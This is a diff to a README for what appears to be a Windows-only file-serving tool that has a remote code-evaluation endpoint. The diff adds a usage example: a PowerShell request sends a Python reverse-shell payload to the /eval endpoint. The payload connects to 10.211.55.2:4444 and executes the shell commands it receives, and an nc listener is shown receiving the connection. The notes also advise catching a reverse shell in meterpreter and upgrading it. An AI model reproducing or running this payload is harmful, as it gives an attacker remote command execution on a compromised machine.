@@ -54,7 +54,6 @@ C:\Users\limitedeternity\AppData\Local\Temp\tmprwfn3bwj.zip
 PS C:\Users\limitedeternity\Downloads> Invoke-RestMethod http://localhost:38080/C:\Users\limitedeternity\AppData\Local\Temp\tmp9i4r3iyh.zip -Outfile test.zip
 PS C:\Users\limitedeternity\Downloads> dir
 
-
     Directory: C:\Users\limitedeternity\Downloads
 
 
@@ -62,10 +61,16 @@ Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----       30.06.2021     22:17        1801859 test.zip
 
+
+PS C:\Users\limitedeternity> $body = @{payload="exec(`"import socket, subprocess;s = socket.socket();s.connect(('10.211.55.2',4444))\nwhile True:  proc = subprocess.Popen(s.recv(1024).decode('utf-8'), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True);s.send(b'\\n'.join(proc.communicate()))`")"}
+PS C:\Users\limitedeternity> Invoke-RestMethod -Method POST -Uri http://localhost:38080/eval -Body ($body | ConvertTo-JSON) -ContentType "application/json"
+
+❯ nc -lvp 4444
+Connection from 10.211.55.6:49259
 ```
 
 ## Notes
 * Windows XP+ **ONLY**
-* I'm not planning to support every possible platform - I need only Windows
+* I'm not planning to support every possible platform - I only need Windows
 * Zip file gets deleted once downloaded
-* I'm not planning to implement file upload functionality – go get yourself a shell
+* I'm not planning to implement file upload functionality – catch a reverse shell in meterpreter and upgrade it 
